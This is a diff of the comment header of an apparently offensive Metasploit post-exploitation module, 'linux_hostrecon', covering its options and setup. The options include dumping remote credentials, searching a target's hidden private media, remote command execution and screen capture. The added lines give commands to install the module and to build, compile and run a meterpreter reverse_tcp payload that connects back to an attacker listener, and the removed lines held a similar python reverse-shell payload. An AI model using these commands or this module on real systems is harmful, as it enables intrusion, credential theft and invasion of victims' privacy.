@@ -27,13 +27,23 @@
 # Dump remote credentials from target?         => set CREDENTIALS_DUMP true
 # list hidden folders/pics/vids porn related?' => set THE_FAPENNING true
 # The bash command to execute remotly          => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
-# Take a screenshot of remote desktop?         => set SCREEN_CAPTURE true
+# Take one screenshot of remote desktop?       => set SCREEN_CAPTURE true
 #
 #
-# [ PORT MODULE TO METASPLOIT DATABASE ]
-# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/gather/linux_hostrecon.rb
-# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/gather/linux_hostrecon.rb
-# Manually Path Search: root@kali:~# locate modules/post/linux/gather
+# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
+# path=$(locate modules/post/linux/gather | grep -v '\doc' | grep -v '\documentation' | head -n 1)
+# sudo cp linux_hostrecon.rb $path/linux_hostrecon.rb
+#
+#
+# [ RELOAD MSF DATABASE (execute in terminal) ]
+# sudo service postgresql start && msfdb reinit
+# sudo msfconsole -x 'db_status;reload_all;exit -y'
+#
+#
+# [ BUILD PAYLOAD TO TEST MODULE ]
+# sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f c -o template.c
+# COMPILE PAYLOAD: sudo gcc -fno-stack-protector -z execstack template.c -o payload
+# EXECUTE PAYLOAD: sudo chmod +x payload && ./payload
 #
 #
 # [ LOAD/USE AUXILIARY ]
@@ -44,20 +54,6 @@
 # msf post(linux_hostrecon) > show advanced options
 # msf post(linux_hostrecon) > set [option(s)]
 # msf post(linux_hostrecon) > exploit
-#
-#
-# [ BUILD PAYLOAD ]
-# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f raw -o agent.py
-# OR: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f c -o template.c
-# gcc -fno-stack-protector -z execstack template.c -o agent
-#
-#
-# [ HINT ]
-# In some linux distributions postgresql needs to be started and
-# metasploit database deleted/rebuild to be abble to load module.
-# 1 - service postgresql start
-# 2 - msfdb reinit   (optional)
-# 3 - msfconsole -q -x 'reload_all'
 ##
 
 
